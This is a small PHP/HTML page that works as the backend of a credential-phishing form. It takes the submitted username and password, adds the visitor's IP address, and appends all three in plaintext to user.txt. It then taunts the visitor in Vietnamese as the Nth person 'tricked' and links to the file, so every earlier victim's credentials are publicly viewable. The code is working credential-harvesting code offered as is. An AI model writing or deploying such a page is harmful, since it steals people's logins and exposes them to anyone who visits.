<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <?php
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $ip = $_SERVER['REMOTE_ADDR'];
        file_put_contents('user.txt',"\n".'username:'.$user.'|password:'.$pass.'|ip:'.$ip,FILE_APPEND);
    ?>
        Bạn là người thứ <?php
    echo count(file('user.txt'))-1; ?> bị bịp <br> Xem những người bị bịp trước tại <a href="user.txt">Đây!</a>
</body>
</html>